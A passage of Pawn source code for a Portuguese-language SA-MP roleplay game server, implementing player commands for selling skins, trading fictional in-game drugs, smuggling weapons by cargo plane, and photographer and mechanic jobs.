			    SendClientMessage(playerid, COR_ERRO, "Esse(a) jogador(a) está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você não pode vender skin para um(a) jogador(a) fardado(a)!");
			    return 1;
			}
            if(GetDistanceBetweenPlayers(playerid, id) > 15) return SendClientMessage(playerid, COR_ERRO, "Você está muito longe, chegue mais perto!");
            if(playerid == id) return SendClientMessage(playerid, COR_ERRO, "Você não pode oferecer skin para você mesmo!");
          	if(GetPlayerCash(id) < valor) return SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) que você deseja skin não tem dinheiro suficiente!");
            if(valor < 1 || valor > 5000) return SendClientMessage(playerid, COR_ERRO, "Somente valores de 1 à 5000.");
			format(gstring, sizeof(gstring), "Você ofereceu a skin ID %d para %s por R$%d.", idskin, PlayerName(id), valor);
			SendClientMessage(playerid, -1, gstring);
			format(gStr, sizeof(gStr), "%s ofereceu pra você a skin ID %d por R$%d. (Use: /sAceitar ou /sRecusar)", PlayerName(playerid), idskin, valor);
			SendClientMessage(id, -1, gStr);
            _SKIN_ID[id] = playerid; _SKIN_SID[id] = idskin; _SKIN_PID[id] = playerid;	_SKIN_VALOR[id] = valor; _SKIN_Oferecido[playerid] = 1; _SKIN_Recebido[id] = 1;
            _SKIN_IID[playerid] = id;
			_SKIN_Timer[id] = SetTimerEx("Skin", 4000, false, "d", id);
			_SKIN_Timer[playerid] = SetTimerEx("LiberarSKin", 30000, false, "d", playerid);
  		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é vendedor de roupas!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/sAceitar", true))
	{
	    if(_SKIN_Recebido[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo skin para você!");
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid, COR_ERRO, "Você precisa estar sobre o chão para aceitar a skin!");
		KillTimer(_SKIN_Timer[playerid]);
	    SendClientFormat(_SKIN_PID[playerid], 0xFFFF00AA, "(+) %s aceitou sua oferta, skin vendida com sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "Você aceitou a skin, oferta feita por %s.", PlayerName(_SKIN_PID[playerid]));
	    sGivePlayerCash(playerid, -_SKIN_VALOR[playerid]);
		sGivePlayerCash(_SKIN_ID[playerid], _SKIN_VALOR[playerid]);
		/* Setar a skin no player e no arquivo dele */
		SetPlayerSkin(playerid, _SKIN_SID[playerid]);
		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		WE_SetInt(gFile, "Skin", _SKIN_SID[playerid]);
		/*				*/
		_SKIN_Oferecido[_SKIN_PID[playerid]] = 0;
		_SKIN_IID[_SKIN_PID[playerid]] = -1;
		_SKIN_Recebido[playerid] = 0;
    	_SKIN_Mensagem[playerid] = 0;
		_SKIN_VALOR[playerid] = 0;
		_SKIN_PID[playerid] = -1;
		_SKIN_SID[playerid] = 0;
	    return 1;
	}
	if(!strcmp(cmdtext, "/sRecusar", true))
    {
        if(_SKIN_Recebido[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo skin para você!");
        KillTimer(_SKIN_Timer[playerid]); KillTimer(_SKIN_Timer[_SKIN_PID[playerid]]);
	    SendClientFormat(_SKIN_PID[playerid], 0xFFCC00AA, "%s recusou sua oferta, a skin não foi vendida, sua venda não obteve sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "(Skin) Você recusou a skin, oferta feita por %s, você não comprou a skin.", PlayerName(_SKIN_PID[playerid]));
	    _SKIN_Oferecido[_SKIN_PID[playerid]] = 0;
	    _SKIN_IID[_SKIN_PID[playerid]] = -1;
	    _SKIN_Recebido[playerid] = 0;
    	_SKIN_Mensagem[playerid] = 0;
		_SKIN_VALOR[playerid] = 0;
		_SKIN_PID[playerid] = -1;
		_SKIN_SID[playerid] = 0;
        return 1;
    }
	if(!strcmp(cmd, "/vmaconha", true))
	{
		if(pInfo[playerid][Prof] == TRAF_DROGAS || pInfo[playerid][Prof] == CHEFE_MAFIA || aInfo[playerid][Admin] == 1)
		{
		    if(Maconha_Oferecido[playerid] == 1) return SendClientMessage(playerid, COR_ERRO, "Você acabou de vender maconha aguarde um pouco!");
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vMaconha [ID] [parangas] [Valor]");
				return 1;
            }
            new id = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vMaconha [ID] [parangas] [Valor]");
				return 1;
            }
            new quantia = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vMaconha [ID] [parangas] [Valor]");
				return 1;
            }
            if(quantia > 10)
            {
                SendClientMessage(playerid, COR_ERRO, "Você só pode vender 10 parangas por jogador!");
                return 1;
            }
            new valor = strval(tmp);
            if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
            if(GetDistanceBetweenPlayers(playerid, id) > 15) return SendClientMessage(playerid, COR_ERRO, "Você está muito longe, chegue mais perto!");
            if(playerid == id) return SendClientMessage(playerid, COR_ERRO, "Você não pode oferecer maconha para você mesmo!");
          	if(GetPlayerCash(id) < valor) return SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) que você deseja vender maconha não tem dinheiro suficiente!");
            if(valor < 1 || valor > 1000) return SendClientMessage(playerid, COR_ERRO, "Somente valores de 1 à 1000.");
			format(gstring, sizeof(gstring), "Você ofereceu %d parangas de maconha para %s por R$%d.", quantia, PlayerName(id), valor);
			SendClientMessage(playerid, -1, gstring);
			format(gStr, sizeof(gStr), "%s ofereceu pra você %d parangas de maconha por R$%d. (Use: /mAceitar ou /mRecusar)", PlayerName(playerid), quantia, valor);
			SendClientMessage(id, -1, gStr);
            Maconha_ID[id] = playerid; Maconha_QTD[id] = quantia; Maconha_PID[id] = playerid;	Maconha_VALOR[id] = valor; Maconha_Oferecido[playerid] = 1; Maconha_Recebido[id] = 1;
            Maconha_IID[playerid] = id;
			Maconha_Timer[id] = SetTimerEx("Maconha", 4000, false, "d", id);
			Maconha_Timer[playerid] = SetTimerEx("LiberarMaconha", 30000, false, "d", playerid);
  		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é traficante nem mafioso!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/mAceitar", true))
	{
	    if(Maconha_Recebido[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo maconha para você!");
	    KillTimer(Maconha_Timer[playerid]);
	    SendClientFormat(Maconha_PID[playerid], 0xFFFF00AA, "(+) %s aceitou sua oferta, maconha vendida com sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "Você aceitou a maconha, oferta feita por %s.", PlayerName(Maconha_PID[playerid]));
	    sGivePlayerCash(playerid, -Maconha_VALOR[playerid]);
		sGivePlayerCash(Maconha_ID[playerid], Maconha_VALOR[playerid]);
        pInfo[playerid][PT_Maconha] += Maconha_QTD[playerid];
		pInfo[Maconha_ID[playerid]][Pego_QtaMaco] -= Maconha_QTD[playerid];
		Maconha_Oferecido[Maconha_PID[playerid]] = 0;
		Maconha_IID[Maconha_PID[playerid]] = -1;
		Maconha_Recebido[playerid] = 0;
    	Maconha_Mensagem[playerid] = 0;
		Maconha_VALOR[playerid] = 0;
		Maconha_PID[playerid] = -1;
		Maconha_QTD[playerid] = 0;
	    return 1;
	}
	if(!strcmp(cmdtext, "/mRecusar", true))
    {
        if(Maconha_Recebido[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo maconha para você!");
        KillTimer(Maconha_Timer[playerid]); KillTimer(Maconha_Timer[Maconha_PID[playerid]]);
	    SendClientFormat(Maconha_PID[playerid], 0xFFCC00AA, "%s recusou sua oferta, a maconha não foi vendida, sua venda não obteve sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "Você recusou a maconha, oferta feita por %s, você não comprou a droga.", PlayerName(Maconha_PID[playerid]));
	    Maconha_Oferecido[Maconha_PID[playerid]] = 0;
	    Maconha_IID[Maconha_PID[playerid]] = -1;
	    Maconha_Recebido[playerid] = 0;
    	Maconha_Mensagem[playerid] = 0;
		Maconha_VALOR[playerid] = 0;
		Maconha_PID[playerid] = -1;
		Maconha_QTD[playerid] = 0;
        return 1;
    }
	if(!strcmp(cmd, "/vcocaina", true))
	{
		if(pInfo[playerid][Prof] == TRAF_DROGAS || pInfo[playerid][Prof] == CHEFE_MAFIA || aInfo[playerid][Admin] == 1)
		{
		    if(Farinha_Oferecido[playerid] == 1) return SendClientMessage(playerid, COR_ERRO, "Você acabou de vender cocaína aguarde um pouco!");
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vCocaina [ID] [pinos] [Valor]");
				return 1;
            }
            new id = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vCocaina [ID] [pinos] [Valor]");
				return 1;
            }
            new quantia = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vCocaina [ID] [pinos] [Valor]");
				return 1;
            }
            new valor = strval(tmp);
            if(quantia > 10)
            {
                SendClientMessage(playerid, COR_ERRO, "Você só pode vender 10 pinos de cocaína por jogador!");
                return 1;
            }
            if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
            if(GetDistanceBetweenPlayers(playerid, id) > 15) return SendClientMessage(playerid, COR_ERRO, "Você está muito longe, chegue mais perto!");
            if(playerid == id) return SendClientMessage(playerid, COR_ERRO, "Você não pode oferecer cocaína para você mesmo!");
          	if(GetPlayerCash(id) < valor) return SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) que você deseja vender cocaína não tem dinheiro suficiente!");
            if(valor < 1 || valor > 1500) return SendClientMessage(playerid, COR_ERRO, "Somente valores de 1 à 1500.");
			format(gstring, sizeof(gstring), "Você ofereceu %d pinos de cocaína para %s por R$%d.", quantia, PlayerName(id), valor);
			SendClientMessage(playerid, -1, gstring);
			format(gStr, sizeof(gStr), "%s ofereceu pra você %d pinos de cocaína por R$%d. (Use: /fAceitar ou /fRecusar)", PlayerName(playerid), quantia, valor);
			SendClientMessage(id, -1, gStr);
            Farinha_ID[id] = playerid; Farinha_QTD[id] = quantia; Farinha_PID[id] = playerid;	Farinha_VALOR[id] = valor; Farinha_Oferecido[playerid] = 1; Farinha_Recebido[id] = 1;
            Farinha_IID[playerid] = id;
			Farinha_Timer[id] = SetTimerEx("Farinha", 4000, false, "d", id);
			Farinha_Timer[playerid] = SetTimerEx("LiberarFarinha", 30000, false, "d", playerid);
  		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é traficante nem mafioso!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/fAceitar", true))
	{
	    if(Farinha_Recebido[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo cocaína para você!");
	    KillTimer(Farinha_Timer[playerid]);
	    SendClientFormat(Farinha_PID[playerid], 0xFFFF00AA, "(+) %s aceitou sua oferta, cocaína vendido com sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "Você aceitou a cocaína, oferta feita por %s.", PlayerName(Farinha_PID[playerid]));
	    sGivePlayerCash(playerid, -Farinha_VALOR[playerid]);
		sGivePlayerCash(Farinha_ID[playerid], Farinha_VALOR[playerid]);
        pInfo[playerid][PT_Cocaina] += Farinha_QTD[playerid];
		pInfo[Farinha_ID[playerid]][Pego_QtaCoca] -= Farinha_QTD[playerid];
		Farinha_Oferecido[Farinha_PID[playerid]] = 0;
		Farinha_IID[Farinha_PID[playerid]] = -1;
		Farinha_Recebido[playerid] = 0;
    	Farinha_Mensagem[playerid] = 0;
		Farinha_VALOR[playerid] = 0;
		Farinha_PID[playerid] = -1;
		Farinha_QTD[playerid] = 0;
	    return 1;
	}
	if(!strcmp(cmdtext, "/fRecusar", true))
    {
        if(Farinha_Recebido[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo cocaína para você!");
        KillTimer(Farinha_Timer[playerid]); KillTimer(Farinha_Timer[Farinha_PID[playerid]]);
	    SendClientFormat(Farinha_PID[playerid], 0xFFCC00AA, "%s recusou sua oferta, a cocaína não foi vendido, sua venda não obteve sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "Você recusou a cocaína, oferta feita por %s, você não comprou a droga.", PlayerName(Farinha_PID[playerid]));
	    Farinha_Oferecido[Farinha_PID[playerid]] = 0;
	    Farinha_IID[Farinha_PID[playerid]] = -1;
	    Farinha_Recebido[playerid] = 0;
    	Farinha_Mensagem[playerid] = 0;
		Farinha_VALOR[playerid] = 0;
		Farinha_PID[playerid] = -1;
		Farinha_QTD[playerid] = 0;
        return 1;
    }
	if(!strcmp(cmd, "/vcrack", true))
	{
		if(pInfo[playerid][Prof] == TRAF_DROGAS || pInfo[playerid][Prof] == CHEFE_MAFIA || aInfo[playerid][Admin] == 1)
		{
		    if(Crack_Oferecido[playerid] == 1) return SendClientMessage(playerid, COR_ERRO, "Você acabou de vender crack aguarde um pouco!");
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vCrack [ID] [Quantia] [Valor]");
				return 1;
            }
            new id = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vCrack [ID] [Quantia] [Valor]");
				return 1;
            }
            new quantia = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vCrack [ID] [Quantia] [Valor]");
				return 1;
            }
            new valor = strval(tmp);
         	if(quantia > 10)
            {
                SendClientMessage(playerid, COR_ERRO, "Você só pode vender 10 crack por jogador!");
                return 1;
            }
            if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
            if(GetDistanceBetweenPlayers(playerid, id) > 15) return SendClientMessage(playerid, COR_ERRO, "Você está muito longe, chegue mais perto!");
            if(playerid == id) return SendClientMessage(playerid, COR_ERRO, "Você não pode oferecer crack para você mesmo!");
          	if(GetPlayerCash(id) < valor) return SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) que você deseja vender crack não tem dinheiro suficiente!");
            if(valor < 1 || valor > 2000) return SendClientMessage(playerid, COR_ERRO, "Somente valores de 1 à 2000.");
			format(gstring, sizeof(gstring), "Você ofereceu %d pedras de crack para %s por R$%d.", quantia, PlayerName(id), valor);
			SendClientMessage(playerid, -1, gstring);
			format(gStr, sizeof(gStr), "%s ofereceu pra você %d pedras de crack por R$%d. (Use: /cAceitar ou /cRecusar)", PlayerName(playerid), quantia, valor);
			SendClientMessage(id, -1, gStr);
            Crack_ID[id] = playerid; Crack_QTD[id] = quantia; Crack_PID[id] = playerid;	Crack_VALOR[id] = valor; Crack_Oferecido[playerid] = 1; Crack_Recebido[id] = 1;
            Crack_IID[playerid] = id;
			Crack_Timer[id] = SetTimerEx("Crack", 4000, false, "d", id);
			Crack_Timer[playerid] = SetTimerEx("LiberarCrack", 30000, false, "d", playerid);
  		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é traficante nem mafioso!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/cAceitar", true))
	{
	    if(Crack_Recebido[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo crack para você!");
	    KillTimer(Crack_Timer[playerid]);
	    SendClientFormat(Crack_PID[playerid], 0xFFFF00AA, "(Crack) %s aceitou sua oferta, crack vendido com sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "(Crack) Você aceitou o crack, oferta feita por %s.", PlayerName(Crack_PID[playerid]));
	    sGivePlayerCash(playerid, -Crack_VALOR[playerid]);
		sGivePlayerCash(Crack_ID[playerid], Crack_VALOR[playerid]);
        pInfo[playerid][PT_Crack] += Crack_QTD[playerid];
		pInfo[Crack_ID[playerid]][Pego_QtaCrac] -= Crack_QTD[playerid];
		Crack_Oferecido[Crack_PID[playerid]] = 0;
		Crack_IID[Crack_PID[playerid]] = -1;
		Crack_Recebido[playerid] = 0;
    	Crack_Mensagem[playerid] = 0;
		Crack_VALOR[playerid] = 0;
		Crack_PID[playerid] = -1;
		Crack_QTD[playerid] = 0;
	    return 1;
	}
	if(!strcmp(cmdtext, "/cRecusar", true))
    {
        if(Crack_Recebido[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo crack para você!");
        KillTimer(Crack_Timer[playerid]); KillTimer(Crack_Timer[Crack_PID[playerid]]);
	    SendClientFormat(Crack_PID[playerid], 0xFFCC00AA, "%s recusou sua oferta, o crack não foi vendido, sua venda não obteve sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "(Crack) Você recusou o crack, oferta feita por %s, você não comprou a droga.", PlayerName(Crack_PID[playerid]));
	    Crack_Oferecido[Crack_PID[playerid]] = 0;
	    Crack_IID[Crack_PID[playerid]] = -1;
	    Crack_Recebido[playerid] = 0;
    	Crack_Mensagem[playerid] = 0;
		Crack_VALOR[playerid] = 0;
		Crack_PID[playerid] = -1;
		Crack_QTD[playerid] = 0;
        return 1;
    }
	if(!strcmp(cmd, "/parmas", true))
	{
	    if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 593)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está em um avião de cargas.");
		    return 1;
		}
		if(pInfo[playerid][Prof] == CONTRABANDISTA)
		{
         	if(PlayerToPoint(30.0, playerid, 368.4688,2504.1355,16.4844))
	        {
		        tmp = strtok(cmdtext, idx);
		        if(!strlen(tmp))
		        {
     				SendClientMessage(playerid, AZUL_WE, "Armamento válido para entrega: ak74, m4, sniper)");
     				SendClientMessage(playerid, COR_ERRO, "Uso válido: /pArmas [Armamento]");
					return 1;
				}
				else if(!strcmp(tmp, "ak74", true))
				{
				    if(pInfo[playerid][KiloD] > 0)
				    {
				        format(gStr, sizeof(gStr), "Você já está carregando AK-74s!", retonarDroga(playerid));
				        SendClientMessage(playerid, COR_ERRO, gStr);
				        return 1;
				    }
				    SendClientMessage(playerid, COR_AMARELO, "Você carregou seu avião com AK-74s, leve para o local de entrega.");
				    SendClientMessage(playerid, AZUL_WE, "Vá em direção ao disco criado em seu mapa para fazer a entrega!");
				    RemovePlayerMapIcon(playerid, 90);
	    		    SetPlayerMapIcon(playerid, 90, -1425.3546, -953.4561, 201.0938, 48,0,MAPICON_GLOBAL_CHECKPOINT);
				    pInfo[playerid][KiloD] = 1;
					return 1;
				}
  				else if(!strcmp(tmp, "m4", true))
				{
				    if(pInfo[playerid][KiloD] > 0)
				    {
				        format(gStr, sizeof(gStr), "Você já está carregando M4s!", retonarDroga(playerid));
				        SendClientMessage(playerid, COR_ERRO, gStr);
				        return 1;
				    }
				    SendClientMessage(playerid, COR_AMARELO, "Você carregou seu avião com M4s, leve para o local de entrega.");
 				    SendClientMessage(playerid, AZUL_WE, "Vá em direção ao disco criado em seu mapa para fazer a entrega!");
				    RemovePlayerMapIcon(playerid, 90);
	    		    SetPlayerMapIcon(playerid, 90, -1425.3546, -953.4561, 201.0938, 48,0,MAPICON_GLOBAL_CHECKPOINT);
				    pInfo[playerid][KiloD] = 2;
					return 1;
				}
  				else if(!strcmp(tmp, "sniper", true))
				{
				    if(pInfo[playerid][KiloD] > 0)
				    {
				        format(gStr, sizeof(gStr), "Você já está carregando Snipers!", retonarDroga(playerid));
				        SendClientMessage(playerid, COR_ERRO, gStr);
				        return 1;
				    }
				    SendClientMessage(playerid, COR_AMARELO, "Você carregou seu avião com Snipers, leve para o local de entrega.");
				    SendClientMessage(playerid, AZUL_WE, "Vá em direção ao disco criado em seu mapa para fazer a entrega!");
				    RemovePlayerMapIcon(playerid, 90);
	    		    SetPlayerMapIcon(playerid, 90, -1425.3546, -953.4561, 201.0938, 48,0,MAPICON_GLOBAL_CHECKPOINT);
				    pInfo[playerid][KiloD] = 3;
				    return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está na área de mercadorias!");
			}
			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Contrabandista!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/earmas", true))
	{
	    if(!PlayerToPoint(30.0, playerid, -1425.3546,-953.4561,201.0938))
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não está na área de entregas!");
	        return 1;
	    }
	    if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 593)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está em um avião de cargas.");
		    return 1;
		}
	    if(pInfo[playerid][Prof] != CONTRABANDISTA)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Contrabandista!");
	        return 1;
	    }
	    if(pInfo[playerid][KiloD] <= 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem nenhuma arma para entregar!");
	        return 1;
	    }
		format(gstring, sizeof(gstring), "{FFFFFF}Você entregou um carregamento de armas e recebeu R$5.000 em dinheiro");
		ShowPlayerDialog(playerid, D_DROGA, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Depósito de Armas", gstring, "Ok", "");
		sGivePlayerCash(playerid, 5000);
		pInfo[playerid][KiloD] = 0;
		RemovePlayerMapIcon(playerid, 90);
	    return 1;
	}
	if(strcmp("/usarcocaina", cmdtext, true, 10) == 0)
	{
		if(pInfo[playerid][PT_Cocaina] <= 0)
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem cocaina para usar!");
			return 1;
		}
		else if(pInfo[playerid][PT_Cocaina] > 0)
		{
		    pInfo[playerid][PT_Cocaina] -= 1;
			SetPlayerDrunkLevel(playerid, 40000);
			SetPlayerWeather(playerid, 250);
			T_Noiado[playerid] = SetTimerEx("PassarEfeitoDrogas", 60000, false, "i", playerid);
			return 1;
		}
		return 1;
	}
	if(strcmp("/usarmaconha", cmdtext, true, 10) == 0)
	{
		if(pInfo[playerid][PT_Maconha] <= 0)
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem maconha para usar!");
			return 1;
		}
		else if(pInfo[playerid][PT_Maconha] > 0)
		{
		    pInfo[playerid][PT_Maconha] -= 1;
			SetPlayerDrunkLevel(playerid, 30000);
			SetPlayerWeather(playerid, 21);
			T_Noiado[playerid] = SetTimerEx("PassarEfeitoDrogas", 60000, false, "i", playerid);
			return 1;
		}
		return 1;
	}
 	if(strcmp("/usarcrack", cmdtext, true, 10) == 0)
	{
		if(pInfo[playerid][PT_Crack] <= 0)
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem crack para usar!");
			return 1;
		}
		else if(pInfo[playerid][PT_Crack] > 0)
		{
            pInfo[playerid][PT_Crack] -= 1;
			SetPlayerDrunkLevel(playerid, 50000);
			SetPlayerWeather(playerid, 444);
			T_Noiado[playerid] = SetTimerEx("PassarEfeitoDrogas", 60000, false, "i", playerid);
			return 1;
		}
		return 1;
	}
	if(!strcmp(cmd, "/infodrogas", true))
	{
	    format(gStr, sizeof(gStr), "(Droga) Cocaína: %d", pInfo[playerid][PT_Cocaina]);
		SendClientMessage(playerid, COR_AMARELO, gStr);
 	    format(gStr, sizeof(gStr), "(Droga) Maconha: %d", pInfo[playerid][PT_Maconha]);
		SendClientMessage(playerid, COR_AMARELO, gStr);
 	    format(gStr, sizeof(gStr), "(Droga) Crack: %d", pInfo[playerid][Pego_QtaCrac]);
		SendClientMessage(playerid, COR_AMARELO, gStr);
	    return 1;
	}
	if(!strcmp(cmd, "/tirarfoto", true))
	{
	    if(pInfo[playerid][Prof] != FOTOGRAFO)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Fotógrafo(a)!");
	        return 1;
	    }
	    if(	Tirou_F[playerid] > gettime())
		{
		    format(gStr, sizeof(gStr), "Aguarde %d segundos para poder tirar uma nova foto!", Tirou_F[playerid] - gettime());
		    SendClientMessage(playerid, COR_ERRO, gStr);
			return 1;
		}
  		if(WE_GetInt(f(playerid), "Fotos") >= 15)
		{
			SendClientMessage(playerid, COR_ERRO, "Você atingiu o máximo de fotos permitidas! (Foto: 15 de 15)");
			return 1;
		}
		WE_SetInt(f(playerid), "Fotos", WE_GetInt(f(playerid), "Fotos") + 1);
		format(gStr, sizeof(gStr), "Você tirou mais uma foto, total de fotos %d de 15 fotos.", WE_GetInt(f(playerid), "Fotos"));
		SendClientMessage(playerid, COR_AMARELO, gStr);
		ApplyAnimation(playerid, "CAMERA","picstnd_in", 4.1,0,1, 1, 1, 1);
		SetTimerEx("FlashFoto", 800, false, "d", playerid);
		PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
		Tirou_F[playerid] = gettime() + 30;
		return 1;
	}
	if(!strcmp(cmd, "/venderfotos", true))
	{
	    if(IsPlayerInRangeOfPoint(playerid, 1.1, 2337.7983, 1723.8367, 10.8203))
	    {
	    	if(pInfo[playerid][Prof] != FOTOGRAFO)
		    {
		        SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Fotógrafo(a)!");
		        return 1;
		    }
			if(WE_GetInt(f(playerid), "Fotos") <= 0)
			{
				SendClientMessage(playerid, COR_ERRO, "Você não tem nenhuma foto para vender!");
				return 1;
			}
			format(gStr, sizeof(gStr), "Você vendeu %d fotos cada uma por R$50 você recebeu 'R$%d' por elas.", WE_GetInt(f(playerid), "Fotos"), WE_GetInt(f(playerid), "Fotos") * 50);
			SendClientMessage(playerid, COR_AMARELO, gStr);
			sGivePlayerCash(playerid, WE_GetInt(f(playerid), "Fotos") * 50);
			WE_SetInt(f(playerid), "Fotos", 0);
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está na agência de fotos!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/autotunning", true))
	{
		if(aInfo[playerid][Admin] == 1)
		{
			new
			 	v = GetPlayerVehicleID(playerid)
	 		;
	 		if(!EUmCarro(v))
	 		{
	 		    SendClientMessage(playerid, COR_ERRO, "Auto Tunning é somente para carros & caminhão!");
	 		    return 1;
	 		}
			new
				Paints = random(3), Cores = random(700)
			;
			ChangeVehiclePaintjob(v, Paints);
			ChangeVehicleColor(v, Cores, Cores);
			AddVehicleComponent(v, 1079);
			AddVehicleComponent(v, 1087);
			AddVehicleComponent(v, 1078);
			AddVehicleComponent(v, 1010);
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Mecânico(a)!");
		}
		return 1;
	}
    if(!strcmp(cmdtext, "/consertar", true))
	{
		if(pInfo[playerid][Prof] == MECANICO || aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1)
		{
			if(!IsPlayerInAnyVehicle(playerid))
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está em um veículo!");
			    return 1;
			}
			SendClientMessage(playerid, COR_AMARELO, "Veículo reparado com sucesso!");
  			new
			 	v = GetPlayerVehicleID(playerid)
	 		;
           	SetVehicleHealth(v, 1000);
          	RepairVehicle(v);
            PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Mecânico(a)!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/pintar", true))
	{
	    if(pInfo[playerid][Prof] == MECANICO || aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
	    {
	        if(!IsPlayerInAnyVehicle(playerid))
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está em um veículo!");
			    return 1;
			}
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Pintar [Cor ID1] [Cor ID2]");
				return 1;
			}
			new
				color1 = strval(tmp)
			;
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Pintar [Cor ID1] [Cor ID2]");
				return 1;
			}
			new
				color2 = strval(tmp)
			;
			new
			 	v = GetPlayerVehicleID(playerid)
	 		;
			format(gStr, sizeof(gStr), "As cores do veículo que você está foram alteradas para {FF1E1E}Cor ID 1: %d {1E90FF}e {FF1E1E}Cor ID 2: %d", color1, color2);
			SendClientMessage(playerid, AZUL_WE, gStr);
			ChangeVehicleColor(v, color1, color2);
			PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é um(a) mecânico(a)!");
		}
		return 1;
	}
	/*if(!strcmp(cmd, "/v", true))
	{
		if(pInfo[playerid][Prof] == INSTRUTOR || aInfo[playerid][Admin] == 1)
		{
			tmp = strtok(cmdtext, idx);
  			if(!strlen(tmp))
  			{
  			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /v [Terrestre/Nautica/Aerea]");
				return 1;
			}
			else if(!strcmp(tmp, "terrestre", true))
			{
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COR_ERRO, "Uso válido: /v Terrestre [ID]");
					return 1;
				}
				new
					id = strval(tmp)
				;
			  	if(pInfo[id][HabT] == 1)
				{
